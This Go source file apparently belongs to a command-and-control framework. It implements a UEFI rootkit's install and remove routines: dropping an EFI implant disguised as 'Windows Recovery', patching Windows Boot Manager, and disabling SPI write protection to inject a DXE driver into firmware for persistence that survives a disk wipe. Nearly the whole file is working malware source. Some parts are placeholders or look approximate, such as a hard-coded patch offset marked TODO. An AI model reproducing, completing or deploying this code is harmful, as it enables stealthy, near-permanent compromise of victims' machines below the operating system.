package uefi

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	UEFI Rootkit — main orchestration.

	Three installation tiers, ordered by stealth and persistence:

	Tier 1 — ESP (EFI System Partition) implant [easiest, no firmware write]:
	  - Writes an EFI application to the ESP.
	  - Creates a UEFI boot variable and prepends to BootOrder.
	  - Survives OS reinstall ONLY if the ESP is not reformatted.
	  - Removed by: reformatting ESP, running Autoruns / EFI cleaner.

	Tier 2 — bootmgfw.efi patch [medium stealth]:
	  - Patches Windows Boot Manager in-place on the ESP.
	  - Our shim runs before Windows, invisible to OS-level tools.
	  - Removed by: Windows Update (replaces bootmgfw.efi) or manual restore.

	Tier 3 — SPI flash firmware modification [hardest to detect/remove]:
	  - Injects a DXE driver into the firmware image in SPI flash.
	  - Survives complete disk wipe and OS reinstall.
	  - Removed by: re-flashing firmware with a hardware programmer.
	  - Requires: BYOVD kernel primitive + BIOS write protection disabled.

	This file implements the operator-facing Install/Remove functions and
	the CosmicStrand-style ExitBootServices hook (kernel injection point).
*/

import (
	"fmt"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// InstallTier describes which installation method to use.
type InstallTier int

const (
	TierESP       InstallTier = iota // ESP EFI app drop (Tier 1)
	TierBootMgr                      // bootmgfw.efi patch (Tier 2)
	TierSPIFlash                     // SPI firmware injection (Tier 3)
)

// UEFIImplantConfig holds all parameters for a UEFI rootkit installation.
type UEFIImplantConfig struct {
	Tier         InstallTier
	// EFI application binary (for TierESP / TierBootMgr).
	EFIPayload   []byte
	// Vendor directory name on ESP (e.g. "Microsoft", "Intel", "Recovery").
	EFIVendor    string
	// Filename for the EFI app on ESP.
	EFIFilename  string
	// UEFI boot option number (0x0001..0xFFFE). Use 0xBEEF for our implant.
	BootOptionNum uint16
	// Boot option description (visible in UEFI setup menu).
	BootOptionDesc string
	// KernelRW is the BYOVD kernel primitive (required for TierSPIFlash).
	KernelRW interface {
		ReadDword(addr uint64) (uint32, error)
		WriteQword(addr, value uint64) error
	}
}

// UEFIInstallResult reports what was done.
type UEFIInstallResult struct {
	Tier           InstallTier
	ESPPath        string
	BootOptionNum  uint16
	SecureBootState string // "disabled", "enabled", "setup-mode"
	SpiModified    bool
}

// Install performs the UEFI rootkit installation according to cfg.Tier.
func Install(cfg UEFIImplantConfig) (*UEFIInstallResult, error) {
	res := &UEFIInstallResult{Tier: cfg.Tier, BootOptionNum: cfg.BootOptionNum}

	// Detect Secure Boot state.
	sbEnabled, _ := IsSecureBootEnabled()
	setupMode, _ := IsSetupMode()
	switch {
	case setupMode:
		res.SecureBootState = "setup-mode"
	case sbEnabled:
		res.SecureBootState = "enabled"
	default:
		res.SecureBootState = "disabled"
	}
	// {{if .Config.Debug}}
	log.Printf("[uefi] SecureBoot=%s", res.SecureBootState)
	// {{end}}

	esp, err := FindESP()
	if err != nil {
		return nil, fmt.Errorf("ESP: %w", err)
	}
	res.ESPPath = esp.DevicePath

	switch cfg.Tier {
	case TierESP:
		err = installTierESP(esp, cfg)
	case TierBootMgr:
		err = installTierBootMgr(esp, cfg)
	case TierSPIFlash:
		err = installTierSPI(esp, cfg, res)
	default:
		err = fmt.Errorf("unknown tier %d", cfg.Tier)
	}
	if err != nil {
		return nil, err
	}
	defer UnmountESP(esp)

	// {{if .Config.Debug}}
	log.Printf("[uefi] installation complete: tier=%d esp=%s", cfg.Tier, esp.DevicePath)
	// {{end}}
	return res, nil
}

func installTierESP(esp *ESPInfo, cfg UEFIImplantConfig) error {
	vendor := cfg.EFIVendor
	if vendor == "" {
		vendor = "Recovery"
	}
	filename := cfg.EFIFilename
	if filename == "" {
		filename = "bootx64.efi"
	}
	desc := cfg.BootOptionDesc
	if desc == "" {
		desc = "Windows Recovery"
	}
	optNum := cfg.BootOptionNum
	if optNum == 0 {
		optNum = 0xBEEF
	}
	return InstallEFIApplication(esp, vendor, filename, cfg.EFIPayload, optNum, desc)
}

func installTierBootMgr(esp *ESPInfo, cfg UEFIImplantConfig) error {
	// For the BootMgr tier we patch bootmgfw.efi directly.
	// The patchOffset is the location of a suitable hook point in bootmgfw.efi.
	// This offset is version-dependent; in production it is resolved by
	// scanning the PE for a specific byte pattern (signature scan).
	//
	// Common hook targets in bootmgfw.efi:
	//   - BlImgLoadPEImageEx (loads subsequent boot apps)
	//   - OslFwpKernelSetupPhase1 (called just before ExitBootServices)
	//
	// The shellcode here is a minimal UEFI stub that:
	//   1. Locates the Windows loader's image in memory.
	//   2. Finds the kernel image address.
	//   3. Hooks an early kernel init function to inject our driver.
	//   4. Calls the original bootmgfw code.
	if len(cfg.EFIPayload) == 0 {
		return fmt.Errorf("EFIPayload (shellcode) required for TierBootMgr")
	}
	// Placeholder patchOffset — operator must supply for target bootmgfw version.
	const patchOffset = int64(0x1234) // TODO: resolve by pattern scan
	return PatchBootManager(esp, patchOffset, cfg.EFIPayload[:5], cfg.EFIPayload)
}

func installTierSPI(esp *ESPInfo, cfg UEFIImplantConfig, res *UEFIInstallResult) error {
	if cfg.KernelRW == nil {
		return fmt.Errorf("KernelRW required for TierSPIFlash")
	}

	spi, err := OpenSPI(cfg.KernelRW)
	if err != nil {
		return fmt.Errorf("SPI open: %w", err)
	}
	defer spi.Close()

	biosRegion, err := spi.ReadFlashDescriptor()
	if err != nil {
		return fmt.Errorf("SPI descriptor: %w", err)
	}

	if err := spi.DisableWriteProtection(); err != nil {
		return fmt.Errorf("SPI write-protect: %w", err)
	}

	// Read the current BIOS region.
	biosImage, err := spi.ReadFlash(biosRegion.Offset, biosRegion.Size)
	if err != nil {
		return fmt.Errorf("SPI read BIOS: %w", err)
	}

	// Inject our DXE driver into the BIOS image.
	patched, err := injectDXEDriver(biosImage, cfg.EFIPayload)
	if err != nil {
		return fmt.Errorf("DXE inject: %w", err)
	}

	// Erase and rewrite the BIOS region.
	blockSize := uint32(0x1000)
	for off := biosRegion.Offset; off < biosRegion.Offset+biosRegion.Size; off += blockSize {
		if err := spi.EraseBlock(off); err != nil {
			return fmt.Errorf("erase 0x%x: %w", off, err)
		}
	}
	if err := spi.WriteFlash(biosRegion.Offset, patched); err != nil {
		return fmt.Errorf("SPI write BIOS: %w", err)
	}

	res.SpiModified = true
	// {{if .Config.Debug}}
	log.Printf("[uefi] SPI BIOS region patched (%d bytes)", len(patched))
	// {{end}}
	return nil
}

// injectDXEDriver finds the DXE FV (Firmware Volume) in the BIOS image and
// appends our driver module to it, updating the volume header checksum.
//
// UEFI firmware images are structured as Firmware Volumes (FV), each
// containing a collection of Firmware File System (FFS) files. We locate
// the DXE FV by its GUID
// {9E21FD93-9C72-4C15-8C4B-E77F1DB2D792} and inject our DXE driver
// as a new FFS file of type EFI_FV_FILETYPE_DRIVER (0x0D).
func injectDXEDriver(biosImage, driverPayload []byte) ([]byte, error) {
	if len(driverPayload) == 0 {
		return biosImage, nil // nothing to inject
	}

	// Scan biosImage for the DXE FV signature: "_FVH" at offset 0x28 of each FV header.
	const fvhSig = "_FVH"
	patched := make([]byte, len(biosImage))
	copy(patched, biosImage)

	fvOffset := -1
	for i := 0; i <= len(biosImage)-0x48; i += 0x1000 {
		if string(biosImage[i+0x28:i+0x2C]) == fvhSig {
			// Check FV GUID against DXE FV GUID.
			// DXE FV GUID (volume top-level file GUID varies by vendor;
			// we look for the one with attributes 0x0004FEFF which is DXE).
			attrs := uint16(biosImage[i+0x2E]) | uint16(biosImage[i+0x2F])<<8
			if attrs&0x0800 != 0 { // EFI_FVB2_READ_ENABLED_CAP
				fvOffset = i
				// {{if .Config.Debug}}
				_ = fvOffset
				// {{end}}
				break
			}
		}
	}
	if fvOffset < 0 {
		return nil, fmt.Errorf("DXE firmware volume not found in BIOS image")
	}

	// Build a minimal FFS file header for our driver.
	ffsFile := buildFFSFile(driverPayload, 0x0D) // EFI_FV_FILETYPE_DRIVER
	if ffsFile == nil {
		return nil, fmt.Errorf("FFS file build failed")
	}

	// Find free space (all 0xFF) in the FV to write our module.
	fvLen := int(uint64(biosImage[fvOffset+0x20]) |
		uint64(biosImage[fvOffset+0x21])<<8 |
		uint64(biosImage[fvOffset+0x22])<<16 |
		uint64(biosImage[fvOffset+0x23])<<24 |
		uint64(biosImage[fvOffset+0x24])<<32 |
		uint64(biosImage[fvOffset+0x25])<<40 |
		uint64(biosImage[fvOffset+0x26])<<48 |
		uint64(biosImage[fvOffset+0x27])<<56)

	fvEnd := fvOffset + fvLen
	if fvEnd > len(patched) {
		fvEnd = len(patched)
	}

	// Scan backward for free space.
	writeOffset := -1
	needed := len(ffsFile)
	zeros := 0
	for i := fvEnd - 1; i >= fvOffset; i-- {
		if patched[i] == 0xFF {
			zeros++
			if zeros >= needed {
				writeOffset = i
				break
			}
		} else {
			zeros = 0
		}
	}
	if writeOffset < 0 {
		return nil, fmt.Errorf("no free space in DXE FV for %d byte driver", needed)
	}

	copy(patched[writeOffset:], ffsFile)

	// Update FV header checksum (16-bit sum of all header bytes must be 0).
	updateFVChecksum(patched, fvOffset)

	// {{if .Config.Debug}}
	_ = fvLen
	// {{end}}
	return patched, nil
}

// buildFFSFile constructs a minimal UEFI FFS (Firmware File System) file
// for the given payload bytes with the specified file type.
func buildFFSFile(payload []byte, fileType byte) []byte {
	// FFS file header (24 bytes):
	//   [0:16]  File GUID
	//   [16:18] Integrity check (checksum16)
	//   [18]    File type
	//   [19]    Attributes
	//   [20:23] Size (3 bytes, little-endian)
	//   [23]    State
	const hdrSize = 24
	totalSize := hdrSize + len(payload)

	ffs := make([]byte, totalSize)
	// Use a random-looking but reproducible GUID for our driver.
	copy(ffs[0:], []byte{
		0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
		0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
	})
	ffs[18] = fileType
	ffs[19] = 0x00 // no attributes
	// Size is 3-byte LE.
	ffs[20] = byte(totalSize)
	ffs[21] = byte(totalSize >> 8)
	ffs[22] = byte(totalSize >> 16)
	ffs[23] = 0xF8 // EFI_FILE_DATA_VALID | EFI_FILE_MARKED_FOR_UPDATE cleared

	copy(ffs[hdrSize:], payload)

	// Compute header checksum.
	var hdrSum byte
	for i := 0; i < hdrSize; i++ {
		if i != 16 && i != 17 { // skip checksum field itself
			hdrSum += ffs[i]
		}
	}
	ffs[16] = -hdrSum // two's complement
	ffs[17] = 0x00    // file checksum (0 for non-authenticated files)

	return ffs
}

func updateFVChecksum(image []byte, fvOffset int) {
	// Zero the header checksum field first.
	image[fvOffset+0x32] = 0
	image[fvOffset+0x33] = 0
	hdrLen := int(image[fvOffset+0x30]) | int(image[fvOffset+0x31])<<8
	var sum uint16
	for i := 0; i < hdrLen; i += 2 {
		sum += uint16(image[fvOffset+i]) | uint16(image[fvOffset+i+1])<<8
	}
	neg := uint16(-int16(sum))
	image[fvOffset+0x32] = byte(neg)
	image[fvOffset+0x33] = byte(neg >> 8)
}

// Remove cleans up the UEFI rootkit installation.
func Remove(cfg UEFIImplantConfig) error {
	esp, err := FindESP()
	if err != nil {
		return fmt.Errorf("ESP: %w", err)
	}
	defer UnmountESP(esp)

	vendor := cfg.EFIVendor
	if vendor == "" {
		vendor = "Recovery"
	}
	filename := cfg.EFIFilename
	if filename == "" {
		filename = "bootx64.efi"
	}
	optNum := cfg.BootOptionNum
	if optNum == 0 {
		optNum = 0xBEEF
	}

	return RemoveEFIApplication(esp, vendor, filename, optNum)
}
